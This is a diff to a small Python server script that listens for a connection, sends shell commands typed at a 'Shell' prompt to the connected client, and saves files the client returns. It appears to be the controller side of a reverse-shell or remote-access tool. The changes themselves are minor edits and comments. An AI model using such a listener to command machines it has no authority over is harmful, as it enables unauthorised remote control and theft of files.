@@ -23,7 +23,7 @@ def main(host, port):
         server.listen(1)
         print(f'{green}[*] Listening on {host}:{port}{reset}')
     except:
-        print(f"{red}[!] Error occurred! Check your host and port address{reset}")
+        print(f"{red}[!] Error occurred!{reset}")
         main()
     
     try:
@@ -31,9 +31,11 @@ def main(host, port):
         print(f"{green}[+] Connected with {address}{reset}\n")
 
         while True:
+            # send command to client
             command = click.prompt("Shell")
             client.send(command.encode())
 
+            # handle response
             response = client.recv(message_buffer).decode()
             match response:
                 case "<FILE>":
@@ -51,6 +53,6 @@ def main(host, port):
 def handle_file(client_socket):
     name = client_socket.recv(1024).decode()
     data = client_socket.recv(file_buffer)
-    with open(name, "wb") as file:
+    with open('data/' + name, "wb") as file:
         file.write(data)
     print(f"{green}[+] Saved file as {name}{reset}")
